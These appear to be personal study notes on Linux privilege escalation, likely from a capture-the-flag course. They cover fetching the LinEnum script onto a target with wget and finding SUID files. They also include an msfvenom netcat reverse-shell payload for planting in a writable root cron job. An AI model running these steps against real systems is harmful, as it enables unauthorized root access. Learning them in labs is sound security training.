
# Horizontal privilage escelation
#### Expand  reach over the compromised system by taking over a different user who is on the same privilege level eg. normal user -> normal user.

# Vertical privilage escelation
#### Attempt to gain higher privileges or access, with an already compromised account 

# Enumeration with LinEnum 
#### A simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root.
#### https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

## Adding LinEnum to target:
1. start Python web server eg. `python3 -m http.server 8000` 
2. on target use `wget` to get file from local machine
3. make file executable - `chmod +x FILENAME.sh`

### OR
1. simply copy paste into .txt on target & save with .sh extension
2. make the file executable using the command `chmod +x FILENAME.sh`

#### Output produces writable files/ sensetive files, SUID(Set owner User ID up on execution) files & cron job list

## SUID exploitation
#### rwx = 4(read)2(write)1(exe) == 7
#### eg 755 = rwxr-xr-x

#### When special permission is given to each user it becomes SUID/ SGID. When extra bit “4” is set to user(Owner) 
it becomes SUID (rws-rwx-rwx) and when bit “2” is set to group it becomes SGID (rwx-rws-rwx).
#### Check for files with the SUID/GUID bit - can be run with the permissions of the file owner/group
#### `find / -perm -u=s -type f 2>/dev/null`

# Other means of priv-esc

## Processes
#### `sudo -l` to list commands usable as a super user on that account (if any). 

## crontab
#### Long-running process that executes commands at specific dates and times. Found in `cat /etc/crontab`
#### Format:
`m   h dom mon dow user  command`
`17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly`
#### Check for files run as root but that can be written to by anyone/you. Edit file to execte shell for example with msfvenom:
`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`
#### write payload to task set to run in cron
